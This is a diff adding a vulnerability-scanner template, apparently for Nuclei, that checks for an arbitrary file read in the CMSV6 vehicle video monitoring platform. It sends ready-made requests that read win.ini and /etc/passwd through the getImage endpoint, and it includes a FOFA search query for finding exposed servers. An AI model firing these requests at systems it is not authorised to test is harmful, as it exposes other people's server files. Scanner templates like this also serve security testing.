@@ -1,0 +1,29 @@
+id: gsky-cmsv6-StandardReportMediaAction-getImage-fileread
+
+info:
+  name: 通天星 CMSV6 车载视频监控平台 StandardReportMediaAction_getImage.action - fileread
+  author: leadlife
+  severity: high
+  description: todo
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="./open/webApi.html"||body="/808gps/"
+  tags: g-sky,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100"
+      - "{{BaseURL}}/808gps/StandardReportMediaAction_getImage.action?filePath=/etc/passwd&fileOffset=1&fileSize=100"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
